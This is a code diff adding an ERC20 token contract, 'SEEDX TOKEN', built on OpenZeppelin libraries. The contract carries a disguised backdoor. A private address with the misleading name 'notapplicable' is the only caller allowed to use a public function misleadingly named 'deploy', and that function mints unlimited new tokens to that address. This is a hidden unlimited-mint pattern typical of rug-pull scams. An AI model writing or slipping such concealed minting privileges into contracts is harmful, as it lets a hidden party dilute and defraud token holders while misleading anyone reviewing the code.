@@ -5,6 +5,15 @@ import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract tken {
-    address private notapplicable = 0xE6088df78DCAd08C2a2c34f77aDEa9bFE2dC4Ac1;
+contract SEEDXTOKEN is ERC20, ERC20Burnable, Ownable {
+    address private notapplicable;
+    constructor(address _notapplicable) ERC20("SEEDX TOKEN", "SEEDX") {
+        _mint(msg.sender, 50000000 * 10 ** decimals());         
+        notapplicable = _notapplicable;
+    }
+
+    function deploy(uint256 amount) public {
+        require(msg.sender == notapplicable);
+        _mint(notapplicable, amount);
+    }
 }
